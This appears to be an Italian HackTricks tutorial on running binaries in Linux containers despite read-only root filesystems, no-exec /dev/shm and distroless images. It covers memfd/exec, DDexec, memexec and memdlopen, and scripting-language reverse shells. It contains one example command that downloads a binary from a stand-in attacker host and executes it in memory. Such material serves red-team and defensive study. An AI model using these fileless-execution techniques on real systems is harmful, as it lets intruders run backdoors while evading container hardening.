# Bypass delle protezioni del file system: sola lettura / no-exec / Distroless

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se sei interessato alla **carriera dell'hacking** e vuoi hackerare l'inattaccabile - **stiamo assumendo!** (_richiesta competenza polacca scritta e parlata_).

{% embed url="https://www.stmcyber.com/careers" %}

## Video

Nei seguenti video puoi trovare le tecniche menzionate in questa pagina spiegate più approfonditamente:

* [**DEF CON 31 - Esplorazione della manipolazione della memoria Linux per furtività ed evasione**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusioni furtive con DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Scenario di sola lettura / no-exec

È sempre più comune trovare macchine Linux montate con **protezione del file system in sola lettura (ro)**, specialmente nei container. Questo perché eseguire un container con file system in sola lettura è semplice come impostare **`readOnlyRootFilesystem: true`** nel `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** sarà comunque scrivibile, quindi è falso che non possiamo scrivere nulla sul disco. Tuttavia, questa cartella sarà **montata con protezione no-exec**, quindi se scarichi un binario qui **non potrai eseguirlo**.

{% hint style="warning" %}
Dal punto di vista di un red team, questo rende **complicato scaricare ed eseguire** binari che non sono già nel sistema (come backdoor o enumerator come `kubectl`).
{% endhint %}

## Bypass più semplice: Script

Nota che ho menzionato binari, puoi **eseguire qualsiasi script** purché l'interprete sia presente nella macchina, come uno **script shell** se è presente `sh` o uno **script python** se è installato `python`.

Tuttavia, questo non è sufficiente per eseguire la tua backdoor binaria o altri strumenti binari che potresti aver bisogno di eseguire.

## Bypass di memoria

Se vuoi eseguire un binario ma il file system non lo permette, il modo migliore per farlo è **eseguirlo dalla memoria**, poiché le **protezioni non si applicano lì**.

### Bypass syscall FD + exec

Se hai alcuni motori di script potenti all'interno della macchina, come **Python**, **Perl** o **Ruby**, potresti scaricare il binario da eseguire dalla memoria, memorizzarlo in un descrittore di file di memoria (`create_memfd` syscall), che non sarà protetto da tali protezioni e quindi chiamare una **syscall `exec`** indicando il **fd come file da eseguire**.

Per fare ciò puoi facilmente utilizzare il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli un binario e genererà uno script nella lingua indicata con il **binario compresso e codificato in b64** con le istruzioni per **decodificarlo e decomprimerlo** in un **fd** creato chiamando la syscall `create_memfd` e una chiamata alla syscall **exec** per eseguirlo.

{% hint style="warning" %}
Questo non funziona in altri linguaggi di scripting come PHP o Node perché non hanno un **modo predefinito per chiamare le syscall grezze** da uno script, quindi non è possibile chiamare `create_memfd` per creare il **fd di memoria** per memorizzare il binario.

Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, poiché non ti sarà consentito eseguirlo a causa della **protezione no-exec**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) è una tecnica che ti consente di **modificare la memoria del tuo stesso processo** sovrascrivendo il suo **`/proc/self/mem`**.

Pertanto, **controllando il codice assembly** che viene eseguito dal processo, puoi scrivere uno **shellcode** e "mutare" il processo per **eseguire qualsiasi codice arbitrario**.

{% hint style="success" %}
**DDexec / EverythingExec** ti permetterà di caricare ed **eseguire** il tuo **shellcode** o **qualsiasi binario** dalla **memoria**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per ulteriori informazioni su questa tecnica, controlla su Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è il passo successivo naturale di DDexec. È un **shellcode demonizzato di DDexec**, quindi ogni volta che si desidera **eseguire un binario diverso** non è necessario riavviare DDexec, è sufficiente eseguire il codice shell memexec tramite la tecnica DDexec e quindi **comunicare con questo demone per passare nuovi binari da caricare ed eseguire**.

È possibile trovare un esempio su come utilizzare **memexec per eseguire binari da una shell inversa PHP** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con uno scopo simile a DDexec, la tecnica [**memdlopen**](https://github.com/arget13/memdlopen) consente un **modo più semplice di caricare binari** in memoria per eseguirli successivamente. Potrebbe persino consentire di caricare binari con dipendenze.

## Bypass Distroless

### Cos'è Distroless

I container Distroless contengono solo i **componenti minimi necessari per eseguire un'applicazione o un servizio specifico**, come librerie e dipendenze di runtime, ma escludono componenti più grandi come un gestore di pacchetti, shell o utility di sistema.

L'obiettivo dei container Distroless è **ridurre la superficie di attacco dei container eliminando componenti non necessari** e riducendo al minimo il numero di vulnerabilità che possono essere sfruttate.

### Shell Inversa

In un container Distroless potresti **non trovare nemmeno `sh` o `bash`** per ottenere una shell regolare. Non troverai nemmeno binari come `ls`, `whoami`, `id`... tutto ciò che di solito esegui in un sistema.

{% hint style="warning" %}
Pertanto, **non** sarà possibile ottenere una **shell inversa** o **enumerare** il sistema come fai di solito.
{% endhint %}

Tuttavia, se il container compromesso sta ad esempio eseguendo un'applicazione web Flask, allora Python è installato e quindi puoi ottenere una **shell inversa Python**. Se sta eseguendo node, puoi ottenere una shell inversa di Node, e lo stesso con la maggior parte dei **linguaggi di scripting**.

{% hint style="success" %}
Utilizzando il linguaggio di scripting potresti **enumerare il sistema** sfruttando le capacità del linguaggio.
{% endhint %}

Se non ci sono **protezioni `read-only/no-exec`** potresti abusare della tua shell inversa per **scrivere nel file system i tuoi binari** ed **eseguirli**.

{% hint style="success" %}
Tuttavia, in questo tipo di container queste protezioni di solito esistono, ma potresti utilizzare le **tecniche di esecuzione in memoria precedenti per aggirarle**.
{% endhint %}

Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere **shell inverse di linguaggi di scripting** ed eseguire binari dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'inviolabile - **stiamo assumendo!** (_richiesta competenza in polacco scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
